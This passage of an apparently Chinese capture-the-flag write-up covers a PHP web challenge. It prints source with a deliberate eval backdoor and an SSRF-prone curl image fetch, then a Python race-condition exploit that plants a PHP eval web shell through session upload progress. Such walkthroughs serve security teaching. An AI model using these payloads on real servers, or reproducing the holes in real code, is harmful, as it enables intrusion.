class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;register&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Registration successful. Please log in.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Registration failed. Please try again.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Login successful.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Invalid username or password.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;create_post&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$imageUrl</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;image_url&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;image_url&#x27;</span>] : <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$post</span>-&gt;<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>], <span class="hljs-variable">$imageUrl</span>)) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Post created successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Failed to create post.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;send_message&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;to_user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;<span class="hljs-title function_ invoke__">send</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;to_user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Message sent successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Failed to send message.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;download_message&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;fail.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$feed</span> = <span class="hljs-variable">$post</span>-&gt;<span class="hljs-title function_ invoke__">getFeed</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是<code>Database.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(DB_HOST, DB_USER, DB_PASS, DB_NAME);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;connect_error);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$params</span> = []</span>) </span>&#123;<br><br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stmt</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$params</span>)) &#123;<br>            <span class="hljs-variable">$types</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$params</span>));<br>            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-variable">$types</span>, ...<span class="hljs-variable">$params</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-string">&#x27;select&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">get_result</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$stmt</span>-&gt;affected_rows;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是<code>User.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$email</span></span>) </span>&#123;<br>        <span class="hljs-variable">$hashedPassword</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$password</span>, PASSWORD_DEFAULT);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO users (username, password, email) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$username</span>, <span class="hljs-variable">$hashedPassword</span>, <span class="hljs-variable">$email</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$username</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$user</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$data</span>))) &lt;= <span class="hljs-number">7</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>post.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Post</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-variable">$userId</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$imageUrl</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO posts (user_id, content, image_url) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-variable">$image</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">uploadImage</span>(<span class="hljs-variable">$userId</span>,<span class="hljs-variable">$imageUrl</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$userId</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$image</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFeed</span>(<span class="hljs-params"><span class="hljs-variable">$page</span> = <span class="hljs-number">1</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-number">10</span></span>) </span>&#123;<br>        <span class="hljs-variable">$offset</span> = (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$limit</span>;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT ?, ?&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$offset</span>, <span class="hljs-variable">$limit</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadImage</span>(<span class="hljs-params"><span class="hljs-variable">$userId</span>, <span class="hljs-variable">$imageUrl</span></span>) </span>&#123;<br>        <br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span> (<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$imageUrl</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$imageContent</span> = <span class="hljs-title function_ invoke__">curl_exec</span> (<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span> (<span class="hljs-variable">$curl</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|gopher|dict/i&#x27;</span>,<span class="hljs-variable">$imageUrl</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php|&lt;\?|script/i&#x27;</span>,<span class="hljs-variable">$imageContent</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$imageContent</span> !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$imageContent</span>)&gt;<span class="hljs-number">50</span>) &#123;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile_&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$imageUrl</span>) . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$imageContent</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;./uploads/&quot;</span> . <span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Message.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Message</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">send</span>(<span class="hljs-params"><span class="hljs-variable">$fromUserId</span>, <span class="hljs-variable">$toUserId</span>, <span class="hljs-variable">$content</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO messages (from_user_id, to_user_id, content) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$fromUserId</span>, <span class="hljs-variable">$toUserId</span>, <span class="hljs-variable">$content</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConversation</span>(<span class="hljs-params"><span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$page</span> = <span class="hljs-number">1</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-number">20</span></span>) </span>&#123;<br>        <span class="hljs-variable">$offset</span> = (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$limit</span>;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE (from_user_id = ? AND to_user_id = ?) OR (from_user_id = ? AND to_user_id = ?) ORDER BY created_at DESC LIMIT ?, ?&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-variable">$limit</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>打包分析一下发现存储在一个文件夹跟进，发现有漏洞的地方是在post.php里，但是已经利用过了</p><p>在index.php里有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$data</span>))) &lt;= <span class="hljs-number">7</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以打一个条件竞争进去</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">file:///etc/php/7.0/apache2/php.ini<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/fox.png" alt="fox"></p><p>然后上exp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;orange&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">WRITE</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            <span class="hljs-string">&#x27;http://challenge.yuanloo.com:27814/index.php&#x27;</span>,<br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;1\necho &#x27;&lt;?php eval($_POST[a]);&#x27;&gt;/var/www/html/uploads/shell.php\n&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;wi.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        request = requests.session()<br>        data = &#123;<br>            <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;login&#x27;</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>        &#125;<br>        request.post(<span class="hljs-string">&quot;http://challenge.yuanloo.com:27814/&quot;</span>, data=data)<br><br>        data = &#123;<br>            <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;download_message&#x27;</span>,<br>            <span class="hljs-string">&#x27;data&#x27;</span>: <span class="hljs-string">&#x27;`. /???/???/???/???/??????????????`;&#x27;</span><br>        &#125;<br>        request.post(<span class="hljs-string">&quot;http://challenge.yuanloo.com:27814/&quot;</span>, data=data)<br><br>        <span class="hljs-keyword">if</span> requests.get(<span 